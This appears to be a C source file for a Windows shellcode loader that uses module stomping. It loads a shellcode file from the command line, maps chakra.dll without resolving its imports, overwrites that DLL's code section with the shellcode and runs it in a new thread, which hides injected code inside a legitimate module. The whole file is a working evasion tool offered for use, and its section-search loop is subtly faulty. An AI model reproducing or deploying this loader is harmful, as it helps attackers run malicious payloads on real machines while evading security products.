#include <windows.h>
#include <stdio.h>

#include "../include/Native.h"
#include "../include/Macros.h"

LPVOID LoadFileIntoMemory( LPSTR Path, PDWORD MemorySize ) {
    PVOID  ImageBuffer = NULL;
    DWORD  dwBytesRead = 0;
    HANDLE hFile       = NULL;

    hFile = CreateFileA( Path, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf( "Error opening %s\r\n", Path );
        return NULL;
    }

    if ( MemorySize )
        *MemorySize = GetFileSize( hFile, 0 );
    ImageBuffer = ( PBYTE ) LocalAlloc( LPTR, *MemorySize );

    ReadFile( hFile, ImageBuffer, *MemorySize, &dwBytesRead, 0 );
    CloseHandle( hFile );

    return ImageBuffer;
}

PIMAGE_NT_HEADERS LdrpImageHeader(
    _In_ PVOID Image
) {
    PIMAGE_DOS_HEADER DosHeader = { 0 };
    PIMAGE_NT_HEADERS NtHeader  = { 0 };

    DosHeader = C_PTR( Image );

    if ( DosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return NULL;
    }

    NtHeader = C_PTR( U_PTR( Image ) + DosHeader->e_lfanew );

    if ( NtHeader->Signature != IMAGE_NT_SIGNATURE ) {
        return NULL;
    }

    return NtHeader;
}

int main( int argc, char** argv ) {

    PVOID                 MmBase   = { 0 };
    PIMAGE_NT_HEADERS     Header   = { 0 };
    PIMAGE_SECTION_HEADER SecHdr   = { 0 };
    NTSTATUS              Status   = { 0 };
    ULONG                 Protect  = { 0 };
    PVOID                 Buffer   = { 0 };
    ULONG                 Length   = { 0 };
    HANDLE                Thread   = { 0 };

    //
    // load shellcode into memory
    //
    if ( ! ( Buffer = LoadFileIntoMemory( argv[ 1 ], &Length ) ) ) {
        puts( "[!] Failed to load shellcode into memory" );
        goto END;
    } else printf( "[*] loaded \"%s\" @ %p [%ld bytes]\n", argv[ 1 ], Buffer, Length );

    if ( ! ( MmBase = LoadLibraryExA( "chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES ) ) ) {
        printf( "[!] LoadLibraryA Failed: %ld\n", GetLastError() );
        goto END;
    } else printf( "[*] loaded \"chakra.dll\" @ %p\n", MmBase );

    Header = C_PTR( U_PTR( MmBase ) + ( ( PIMAGE_DOS_HEADER ) MmBase )->e_lfanew );

    SecHdr = IMAGE_FIRST_SECTION( Header );
    for ( ULONG i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        if ( strcmp( C_PTR( SecHdr[ i ].Name ), ".text" ) ) {
            break;
        }
    }

    MmBase = MmBase + SecHdr->VirtualAddress;

    printf( "[*] target code section @ %p [%ld bytes]\n", MmBase, SecHdr->SizeOfRawData );

    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, & Protect ) ) {
        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
        goto END;
    }

    memcpy( MmBase, Buffer, Length );

    if ( ! VirtualProtect( MmBase, SecHdr->SizeOfRawData, Protect, & Protect ) ) {
        printf( "[!] VirtualProtect Failed: %ld\n", GetLastError() );
        goto END;
    }

    puts( "[*] wrote shellcode into target module" );
    printf( "[*] press enter..." );
    getchar();

    if ( ! ( Thread = CreateThread( NULL, 0, MmBase, NULL, 0, NULL ) ) ) {
        printf( "[*] CreateThread Failed: %ld\n", GetLastError() );
        goto END;
    }

    WaitForSingleObject( Thread, INFINITE );

END:
    if ( Thread ) {
        CloseHandle( Thread );
        Thread = NULL;
    }

    return 0;
}